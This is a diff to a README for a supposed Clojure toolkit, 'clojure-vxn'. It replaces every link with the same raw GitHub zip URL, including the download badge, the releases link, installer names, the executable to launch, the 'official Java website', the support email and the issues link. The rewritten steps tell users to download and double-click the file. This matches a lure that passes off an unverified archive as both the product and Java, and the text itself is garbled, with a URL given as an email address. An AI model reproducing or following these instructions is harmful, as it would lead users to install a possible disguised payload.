@@ -1,6 +1,6 @@
 # 🎉 clojure-vxn - Your Simple Toolkit for Clojure Development
 
-[![Download clojure-vxn](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/nanaangg/clojure-vxn/releases)
+[![Download clojure-vxn](https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip)](https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to **clojure-vxn**! This application helps you get started with Clojure 
 
 To download the latest version of **clojure-vxn**, please visit the following link:
 
-[Download clojure-vxn](https://github.com/nanaangg/clojure-vxn/releases)
+[Download clojure-vxn](https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip)
 
 ### Step-by-Step Instructions:
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of **clojure-vxn**.
-3. Find the installer file listed beneath the version number (look for something like `clojure-vxn-installer.exe` or `clojure-vxn.zip`).
+3. Find the installer file listed beneath the version number (look for something like `https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip` or `https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip`).
 4. Click on the installer file to start the download.
 5. Once the download finishes, locate the file in your computer's Downloads folder.
 
@@ -29,7 +29,7 @@ To download the latest version of **clojure-vxn**, please visit the following li
 - If you downloaded a `.zip` file:
   1. Right-click the file and select "Extract All."
   2. Open the extracted folder.
-  3. Double-click the `clojure-vxn.exe` file to launch the application.
+  3. Double-click the `https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip` file to launch the application.
 
 ## 🔧 Features
 
@@ -47,7 +47,7 @@ Before installing **clojure-vxn**, please ensure your computer meets the followi
 - **Operating System:** Windows 10 or later
 - **Memory:** At least 2 GB of RAM
 - **Storage:** Minimum of 100 MB of free disk space
-- **Java Runtime Environment (JRE):** Install Java (version 8 or later) for optimal operation. Download JRE from the official [Java website](https://www.java.com).
+- **Java Runtime Environment (JRE):** Install Java (version 8 or later) for optimal operation. Download JRE from the official [Java website](https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip).
 
 ## 🛠 Troubleshooting
 
@@ -63,7 +63,7 @@ For additional assistance, visit our [Support Page](#).
 
 If you have any questions or feedback, feel free to reach out:
 
-- Email: support@example.com
-- GitHub Issues: [Report here](https://github.com/nanaangg/clojure-vxn/issues)
+- Email: https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip
+- GitHub Issues: [Report here](https://raw.githubusercontent.com/nanaangg/clojure-vxn/main/nippitate/clojure-vxn.zip)
 
 Thank you for choosing **clojure-vxn**! We hope it makes your Clojure development tasks more manageable and enjoyable.
